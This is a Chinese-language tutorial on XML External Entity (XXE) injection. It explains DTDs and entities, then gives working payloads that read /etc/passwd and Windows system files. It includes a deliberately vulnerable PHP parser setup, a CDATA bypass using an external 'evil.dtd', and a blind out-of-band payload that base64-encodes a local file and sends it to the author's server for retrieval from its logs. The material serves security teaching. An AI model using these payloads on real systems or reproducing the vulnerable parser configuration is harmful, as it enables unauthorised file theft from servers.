# XXE外部实体注入

## XML基础知识

### XML简介：

XXE(XML External  Entity Injection)  XML外部实体注入，XML是一种类似于HTML（超文本标记语言）的可扩展标记语言，是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

**文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。**

**DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。**

### 内部的 DOCTYPE 声明

假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：

```
<!DOCTYPE 根元素 [元素声明]>
```

带有 DTD 的 XML 文档实例：

```
<?xml version="1.0"?>
<!DOCTYPE note [
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to      (#PCDATA)>
<!ELEMENT from    (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body    (#PCDATA)>
]>
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

**根据以上代码，做出如下解释**

!DOCTYPE note (第二行)定义此文档是 note 类型的文档。

!ELEMENT note (第三行)定义 note 元素有四个元素："to、from、heading,、body"

!ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型

!ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型

!ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型

!ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型

### 外部文档声明

假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD:

```
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 
```

这是包含 DTD 的 "note.dtd" 文件：

```
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。

通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。

而您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。

您还可以使用 DTD 来验证您自身的数据。

**学习了DTD的两种引用方法，下面我们主要学习以下XXE漏洞需要利用的DTD实体**

##### 实体的概念：

> 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。
>
> 实体引用是对实体的引用。
>
> 实体可在内部或外部进行声明。

### 一个内部实体声明

### 语法：

```
<!ENTITY 实体名称 "实体的值">
```

### 例子：

DTD 例子:

```
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
```

XML 例子:

```
<author>&writer;&copyright;</author>
```

注释: 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。

### 一个外部实体声明

### 语法：

```
<!ENTITY 实体名称 SYSTEM "URI/URL">
```

### 例子：

DTD 例子:

```
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
```

XML 例子:

```
<author>&writer;&copyright;</author>
```

有了以上的XML和DTD的知识基础，我们就可以学习XXE漏洞了。

## **XXE漏洞——XML外部实体注入(XML External Entity)**

当应用是通过用户上传的XML文件或POST请求进行数据的传输，并且应用没有禁止XML引用外部实体，也没有过滤用户提交的XML数据，那么就会产生XML外部实体注入漏洞，即XXE漏洞

#### 例1：

```
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY b SYSTEM "file:///etc/passwd" >]>
<x>&b;</x>
```

如果以上xml代码被解析，则会返回/etc/passwd文件的内容。

#### 例2：

```
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY % d SYSTEM "http://xxx.com/xxe.dtd" >
%d;
]>
<x>&xxe;</x>
```

http://xxxx.com/xxe.dtd的内容为：

```
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
```

有的小伙伴可能已经发现了，例1中实体名前面并没有%，而例2中实体名前是有%的，这里的区别在于，例1中定义的实体是通用实体，而例2中定义的是参数实体，并且参数实体只能在dtd中使用，即例2代码中的第三行 **%d;**，这里就像在外面引用统用实体一样，这里的%d;就引用了http://xxx.com/xxe.dtd这个文件到dtd中。

#### 例3：

```
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://xxx.com/xxe.dtd">
<x>&xxe;</x>
```

http://xxxx.com/xxe.dtd的内容为：

```
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
```



不同程序支持的协议不同，如下图：

| LIBXML2 | PHP            | JAVA     | .NET  |
| ------- | -------------- | -------- | ----- |
| file    | file           | http     | file  |
| http    | http           | https    | http  |
| ftp     | ftp            | ftp      | https |
|         | php            | file     | ftp   |
|         | compress.zlib  | jar      |       |
|         | compress.bzip2 | netdoc   |       |
|         | data           | mailto   |       |
|         | glob           | gopher * |       |
|         | phar           |          |       |

**以上面的例子可能还是说的不太清楚，那我们就用一个实例来看一下XXE漏洞到底是什么东西：**

### 实例1：

**环境设置**

PHPstudy集成 Apache2.4.39 PHP5.2.17nts

**xxe.php后端代码**

```
<?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
echo $creds;
?>
```

**访问**

![1605945314_5fb8c7e23829ef7ca26b5.png!small?1605945314824](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1605945314_5fb8c7e23829ef7ca26b5.png!small)

**刷新并抓包，POST我们构造的payload**

![1605945317_5fb8c7e57a2ceb414156d.png!small?1605945318220](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1605945317_5fb8c7e57a2ceb414156d.png!small)

**发包返回我们查看的c:/windows/system.ini**

![1605945321_5fb8c7e930b979c13cc17.png!small?1605945321657](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1605945321_5fb8c7e930b979c13cc17.png!small)

## 读取文件时有特殊符号

在读取文件时，文件中包含"<,>,&"等这些特殊符号时，会被xml解析器解析，报错从而导致读取失败，例如尝试读取以下文件

C:\test.txt

内容：

```
<Baize Sec>
```

payload:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE creds [<!ENTITY xxe SYSTEM "file:///c:/test.txt">]>
<creds>&xxe;</creds>
```

![1607183441_5fcbac51be8a7f781bccd.png!small](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1607183441_5fcbac51be8a7f781bccd.png!small)

可以看到与读system.ini不同，这里报错了，想知道原因需要了解CDATA和PCDATA

### PCDATA

PCDATA 指的是被解析的字符数据（Parsed Character Data）。

XML 解析器通常会解析 XML 文档中所有的文本。

当某个 XML 元素被解析时，其标签之间的文本也会被解析：

```
<message>此文本也会被解析</message>
```

解析器之所以这么做是因为 XML 元素可包含其他元素，就像这个例子中，其中的 <name>元素包含着另外的两个元素(first 和 last)：

```
<name><first>Bill</first><last>Gates</last></name>
```

而解析器会把它分解为像这样的子元素：

```
<name>
<first>Bill</first>
<last>Gates</last>
</name>
```

### CDATA

术语 CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。

在 XML 元素中，"<" 和 "&" 是非法的。

"<" 会产生错误，因为解析器会把该字符解释为新元素的开始。

"&" 也会产生错误，因为解析器会把该字符解释为字符实体的开始。

某些文本，比如 JavaScript 代码，包含大量 "<" 或 "&" 字符。为了避免错误，可以将脚本代码定义为 CDATA。

CDATA 部分中的所有内容都会被解析器忽略。

CDATA 部分由 "<![CDATA[" 开始，由 "]]>" 结束：

```
<script>
<![CDATA[
function matchwo(a,b)
{
if (a < b && a < 0) then
{
return 1;
}
else
{
return 0;
}
}
]]>
</script>
```

在上面的例子中，解析器会忽略 CDATA 部分中的所有内容。

#### 关于 CDATA 部分的注释：

CDATA 部分不能包含字符串 "]]>"。也不允许嵌套的 CDATA 部分。

标记 CDATA 部分结尾的 "]]>" 不能包含空格或折行。

我们的思路就是把读取的文件放在CDATA中之后再调用，那么构造一个POC如下

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag
[<!ENTITY start
"<![CDATA[<!ENTITY % xxe SYSTEM "file:///c:/test.txt"> ]]>"
>]
% xxe;>
<roottag>&start</roottag>
```

但是还是读不出来，如下图：

![1607183478_5fcbac76c64f080fb3a5d.png!small](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1607183478_5fcbac76c64f080fb3a5d.png!small)直接放正确的payload，然后再讲解原因

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % start "<![CDATA[">
<!ENTITY % go SYSTEM "file:///c:/test.txt">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://aaaaahui.com/evil.dtd"> %dtd;
]> 
<root>&all;</root>
```

http://aaaaahui.com/evil.dtd

```
<!ENTITY all "%start;%go;%end;">
```

![1607183487_5fcbac7fa4f73085875de.png!small](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1607183487_5fcbac7fa4f73085875de.png!small)可以看到这个payload是可以成功读取文件的，对比两个payload

![1607183499_5fcbac8b9b55d80810186.png!small](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1607183499_5fcbac8b9b55d80810186.png!small)



![1607183507_5fcbac93835c218916471.png!small](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1607183507_5fcbac93835c218916471.png!small)

两个payload的逻辑都是一样的，不过第二个是调用的外部的dtd文档就可以，这是因为在xml中，xml 解析器有个限制：不能在内部 Entity 中引用，“PEReferences forbidden in internal subset in  Entity ”指的就是禁止内部参数实体引用。

## 无回显xxe漏洞利用

现在很多xxe漏洞都是没有回显的，下面是再没有回显的时候可以的利用方式。

思路就是在没有回显的时候，我们将读取的文件带出来，举一个例子就是，我们如果将/etc/passwd文件赋给实体test，那么我们在访问http://www.aaaaahui.com/?%test时，我们服务器上的日志文件就会保存/etc/passwd的文件内容，下面进行实验：

```
<?xml version="1.0"?>
<!DOCTYPE message [    
<!ENTITY % remote SYSTEM "http://aaaaahui.com/xml.dtd">
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///c:/test.txt">
%remote;
%send;
]>
<message>1234</message>
```

xml.dtd

```
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'http://aaaaahui.com/?%file;'>">%start
```

&#x25是%的html实体编码，因为在xml.dtd的实体中不能有%

实验如下图

![1607183516_5fcbac9c89546b2fb236f.png!small](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1607183516_5fcbac9c89546b2fb236f.png!small)

查看日志文件

![1607183525_5fcbaca5ca6bd9c3dd452.png!small](XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/1607183525_5fcbaca5ca6bd9c3dd452.png!small)

这里我们读取的文件已经带出来了，那么原理就是将文件赋给实体后带着访问我们的vps然后在日志文件中就能看到我们读取的文件了。